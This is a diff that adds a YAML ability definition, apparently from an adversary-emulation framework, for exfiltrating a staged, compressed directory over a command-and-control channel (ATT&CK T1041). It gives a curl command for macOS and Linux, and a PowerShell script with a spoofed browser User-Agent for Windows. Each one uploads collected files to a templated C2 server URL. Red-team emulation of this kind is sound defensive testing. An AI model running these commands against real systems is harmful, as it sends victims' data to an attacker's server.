@@ -1,0 +1,43 @@
+---
+
+- id: ea713bc4-63f0-491c-9a6f-0b01d560b87e
+  name: Exfil staged directory
+  description: Exfil the staged directory
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
+  platforms:
+    darwin:
+      sh:
+        command: |
+          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+    linux:
+      sh:
+        command: |
+          curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+    windows:
+      psh,pwsh:
+        # REF: https://stackoverflow.com/a/45409728
+        command: |
+          $ErrorActionPreference = 'Stop';
+          $fieldName = "#{host.dir.compress}";
+          $filePath = "#{host.dir.compress}";
+          $url = "#{server}/file/upload";
+
+          Add-Type -AssemblyName 'System.Net.Http';
+
+          $client = New-Object System.Net.Http.HttpClient;
+          $content = New-Object System.Net.Http.MultipartFormDataContent;
+          $fileStream = [System.IO.File]::OpenRead($filePath);
+          $fileName = [System.IO.Path]::GetFileName($filePath);
+          $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+          $content.Add($fileContent, $fieldName, $fileName);
+          $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
+          $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+
+          $result = $client.PostAsync($url, $content).Result;
+          $result.EnsureSuccessStatusCode();
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.dir.compress
